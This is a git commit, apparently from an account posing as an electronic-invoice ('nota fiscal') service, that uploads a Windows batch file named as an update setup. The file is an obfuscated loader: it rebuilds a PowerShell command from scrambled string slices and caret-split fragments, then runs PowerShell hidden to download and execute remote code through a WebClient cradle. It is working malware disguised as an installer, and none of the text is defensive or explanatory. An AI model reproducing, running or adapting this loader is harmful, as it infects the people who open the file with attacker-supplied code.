6f85a1f4cd3fbacd6c80f5c3e96d511eb8396a64
Notafiscaeletronica2018 <38476321+Notafiscaeletronica2018@users.noreply.github.com>
2018-04-24 13:01:22 -0300

    Add files via upload

---
+++ Setup Atualização 22.9.cmd
@@ -0,0 +1,22 @@
+@echo off
+cls
+cd %SystemRoot%\System32
+set iwt3D4YJF=/'tvklp[mrjJ17gfDQUFqbTE8o?ndeh)0Vs-wOBxi(ZGS;4yNW6"=]Y92.X3RczL}{+MKHAC:P5Iua
+set LLillSo6N=^W^i^n
+set AAhC6gnpFRHsp=^dow
+set l3pTtrTGJi=^s^Po
+set Qsqfgz4jUPfMdE=w^e^r
+set brSlzmhuh=Sh^e
+set G7OWnmfm3=^ll^\
+set jZhkcVzFpjp=^v1.
+set cIaX0XamDAI3i8O=^0\po
+set PuU0q84aLilu=^we
+set zTbixSSuqZc=^r^sh
+set uZ3LofonX2kpy2=^el^l
+set Xd8yvWsFAVPeEh=.ex
+set R5Anu45y2mM3Pux=^e -^n
+set lZlYChhXgTB=op^ 
+set MxNYGOojogCVUEa=^-w
+set T2E9akebi=in^ ^1 ^-
+set RPtXrKTt71dG3=%iwt3D4YJF:~40,1%%iwt3D4YJF:~29,1%%iwt3D4YJF:~39,1%%iwt3D4YJF:~41,1%%iwt3D4YJF:~51,1%%iwt3D4YJF:~75,1%%iwt3D4YJF:~23,1%%iwt3D4YJF:~58,1%%iwt3D4YJF:~41,1%%iwt3D4YJF:~48,1%%iwt3D4YJF:~29,1%%iwt3D4YJF:~36,1%%iwt3D4YJF:~35,1%%iwt3D4YJF:~37,1%%iwt3D4YJF:~21,1%%iwt3D4YJF:~10,1%%iwt3D4YJF:~29,1%%iwt3D4YJF:~61,1%%iwt3D4YJF:~2,1% %iwt3D4YJF:~48,1%%iwt3D4YJF:~29,1%%iwt3D4YJF:~2,1%%iwt3D4YJF:~57,1%%iwt3D4YJF:~49,1%%iwt3D4YJF:~29,1%%iwt3D4YJF:~21,1%%iwt3D4YJF:~71,1%%iwt3D4YJF:~5,1%%iwt3D4YJF:~40,1%%iwt3D4YJF:~29,1%%iwt3D4YJF:~27,1%%iwt3D4YJF:~2,1%%iwt3D4YJF:~31,1%%iwt3D4YJF:~57,1%%iwt3D4YJF:~16,1%%iwt3D4YJF:~25,1%%iwt3D4YJF:~36,1%%iwt3D4YJF:~27,1%%iwt3D4YJF:~5,1%%iwt3D4YJF:~25,1%%iwt3D4YJF:~77,1%%iwt3D4YJF:~28,1%%iwt3D4YJF:~44,1%%iwt3D4YJF:~2,1%%iwt3D4YJF:~9,1%%iwt3D4YJF:~40,1%%iwt3D4YJF:~27,1%%iwt3D4YJF:~14,1%%iwt3D4YJF:~41,1%%iwt3D4YJF:~1,1%%iwt3D4YJF:~30,1%%iwt3D4YJF:~2,1%%iwt3D4YJF:~2,1%%iwt3D4YJF:~6,1%%iwt3D4YJF:~34,1%%iwt3D4YJF:~72,1%%iwt3D4YJF:~0,1%%iwt3D4YJF:~0,1%%iwt3D4YJF:~40,1%%iwt3D4YJF:~27,1%%iwt3D4YJF:~15,1%%iwt3D4YJF:~25,1%%iwt3D4YJF:~2,1%%iwt3D4YJF:~29,1%%iwt3D4YJF:~61,1%%iwt3D4YJF:~39,1%%iwt3D4YJF:~56,1%%iwt3D4YJF:~57,1%%iwt3D4YJF:~15,1%%iwt3D4YJF:~76,1%%iwt3D4YJF:~27,1%%iwt3D4YJF:~0,1%%iwt3D4YJF:~8,1%%iwt3D4YJF:~25,1%%iwt3D4YJF:~3,1%%iwt3D4YJF:~34,1%%iwt3D4YJF:~28,1%%iwt3D4YJF:~15,1%%iwt3D4YJF:~76,1%%iwt3D4YJF:~40,1%%iwt3D4YJF:~25,1%%iwt3D4YJF:~34,1%%iwt3D4YJF:~28,1%%iwt3D4YJF:~15,1%%iwt3D4YJF:~0,1%%iwt3D4YJF:~26,1%%iwt3D4YJF:~77,1%%iwt3D4YJF:~52,1%%iwt3D4YJF:~42,1%%iwt3D4YJF:~32,1%%iwt3D4YJF:~16,1%%iwt3D4YJF:~23,1%%iwt3D4YJF:~58,1%%iwt3D4YJF:~18,1%%iwt3D4YJF:~38,1%%iwt3D4YJF:~44,1%%iwt3D4YJF:~49,1%%iwt3D4YJF:~16,1%%iwt3D4YJF:~13,1%%iwt3D4YJF:~19,1%%iwt3D4YJF:~23,1%%iwt3D4YJF:~46,1%%iwt3D4YJF:~74,1%%iwt3D4YJF:~22,1%%iwt3D4YJF:~59,1%%iwt3D4YJF:~11,1%%iwt3D4YJF:~69,1%%iwt3D4YJF:~38,1%%iwt3D4YJF:~67,1%%iwt3D4YJF:~67,1%%iwt3D4YJF:~11,1%%iwt3D4YJF:~58,1%%iwt3D4YJF:~71,1%%iwt3D4YJF:~49,1%%iwt3D4YJF:~59,1%%iwt3D4YJF:~16,1%%iwt3D4YJF:~37,1%%iwt3D4YJF:~48,1%%iwt3D4YJF:~55,1%%iwt3D4YJF:~24,1%%iwt3D4YJF:~73,1%%iwt3D4YJF:~55,1%%iwt3D4YJF:~63,1%%iwt3D4YJF:~54,1%%iwt3D4YJF:~59,1%%iwt3D4YJF:~44,1%%iwt3D4YJF:~60,1%%iwt3D4YJF:~22,1%%iwt3D4YJF:~1,1%%iwt3D4YJF:~31,1%%iwt3D4YJF:~51,1%%iwt3D4YJF:~31,1%%iwt3D4YJF:~45,1%
+echo %%RPtXrKTt71dG3%% | %LLillSo6N%%AAhC6gnpFRHsp%%l3pTtrTGJi%%Qsqfgz4jUPfMdE%%brSlzmhuh%%G7OWnmfm3%%jZhkcVzFpjp%%cIaX0XamDAI3i8O%%PuU0q84aLilu%%zTbixSSuqZc%%uZ3LofonX2kpy2%%Xd8yvWsFAVPeEh%%R5Anu45y2mM3Pux%%lZlYChhXgTB%%MxNYGOojogCVUEa%%T2E9akebi%
